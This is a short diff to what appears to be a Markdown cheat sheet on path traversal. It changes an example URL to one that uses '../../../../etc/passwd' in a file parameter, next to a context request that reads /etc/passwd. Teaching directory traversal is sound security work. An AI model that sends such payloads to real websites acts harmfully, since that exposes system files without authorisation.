@@ -12,7 +12,8 @@ GET /files/../../../etc/passwd HTTP/1.1
 Host: vulnerable-website.com
 ```
 ### Example URL
-```https://vulnerable-website.com/files/../../../etc/passwd
+```bash
+https://tager.com/image?file=../../../../etc/passwd
 ``` 
 
 ## 🔐 Payload Cheat Sheet
